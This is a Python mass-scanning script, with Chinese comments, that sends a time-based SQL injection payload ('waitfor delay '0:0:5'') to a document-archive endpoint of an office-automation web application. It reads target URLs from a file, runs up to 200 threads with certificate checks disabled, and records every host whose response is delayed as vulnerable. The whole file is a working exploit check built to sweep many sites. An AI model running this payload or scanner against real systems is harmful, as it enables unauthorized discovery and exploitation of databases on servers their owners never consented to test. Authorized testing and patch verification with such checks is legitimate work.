import requests
import threading
import time
from urllib.parse import urljoin
import urllib3

# 禁用SSL警告
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 线程锁，用于安全写入文件
file_lock = threading.Lock()

def check_vulnerability(url, results_file):
    """
    检测单个URL是否存在漏洞
    """
    try:
        # 构造完整的URL，包含Payload
        base_url = url.rstrip('/')
        payload = "/c6/Jhsoft.Web.Archives/ArchivesAdviceInsert.aspx/?fileid=1&filetype=1'waitfor delay'0:0:5'--"
        target_url = base_url + payload
        
        # 记录开始时间
        start_time = time.time()
        
        # 发送请求，禁用SSL验证，设置超时时间为10秒
        response = requests.get(
            target_url,
            verify=False,
            allow_redirects=False,  # 不允许重定向
            timeout=10
        )
        
        # 计算请求耗时
        elapsed_time = time.time() - start_time
        
        status_code = response.status_code
        
        # 判断漏洞是否存在
        if 300 <= status_code < 400:
            # 3xx状态码，认为不存在漏洞
            print(f"[INFO] URL: {url.strip()} - 状态码: {status_code} - 漏洞不存在")
        
        elif status_code == 200 and elapsed_time >= 4.5:  # 考虑网络延迟，设置为4.5秒
            # 状态码200且延时约5秒，认为漏洞存在
            result_msg = f"[VULNERABLE] URL: {url.strip()} - 状态码: {status_code} - 响应时间: {elapsed_time:.2f}秒 - 漏洞存在\n"
            print(result_msg)
            
            # 写入结果文件
            with file_lock:
                with open(results_file, 'a', encoding='utf-8') as f:
                    f.write(result_msg)
        
        else:
            # 其他情况
            print(f"[INFO] URL: {url.strip()} - 状态码: {status_code} - 响应时间: {elapsed_time:.2f}秒 - 漏洞不存在")
    
    except requests.exceptions.Timeout:
        print(f"[ERROR] URL: {url.strip()} - 请求超时")
    
    except requests.exceptions.ConnectionError:
        print(f"[ERROR] URL: {url.strip()} - 连接错误")
    
    except requests.exceptions.RequestException as e:
        print(f"[ERROR] URL: {url.strip()} - 请求异常: {str(e)}")
    
    except Exception as e:
        print(f"[ERROR] URL: {url.strip()} - 未知错误: {str(e)}")

def main():
    """
    主函数
    """
    # 文件路径
    url_file = "url.txt"
    results_file = "result.txt"
    
    try:
        # 读取URL列表
        with open(url_file, 'r', encoding='utf-8') as f:
            urls = f.readlines()
        
        if not urls:
            print("url.txt文件中没有找到URL")
            return
        
        print(f"共读取到 {len(urls)} 个URL，开始检测...")
        
        # 清空结果文件
        with open(results_file, 'w', encoding='utf-8') as f:
            f.write("漏洞检测结果:\n" + "="*50 + "\n")
        
        # 创建线程列表
        threads = []
        max_threads = 200
        
        # 启动线程
        for url in urls:
            url = url.strip()
            if not url:
                continue
                
            # 等待直到有可用的线程槽位
            while threading.active_count() > max_threads:
                time.sleep(0.1)
            
            thread = threading.Thread(target=check_vulnerability, args=(url, results_file))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # 等待所有线程完成
        for thread in threads:
            thread.join()
        
        print("\n检测完成！")
        
        # 读取并显示检测结果
        try:
            with open(results_file, 'r', encoding='utf-8') as f:
                results = f.read()
                if results:
                    print("\n发现的漏洞:")
                    print(results)
                else:
                    print("\n未发现任何漏洞")
        except FileNotFoundError:
            print("\n未发现任何漏洞")
    
    except FileNotFoundError:
        print(f"错误: 找不到文件 {url_file}")
    
    except Exception as e:
        print(f"程序执行出错: {str(e)}")

if __name__ == "__main__":
    main()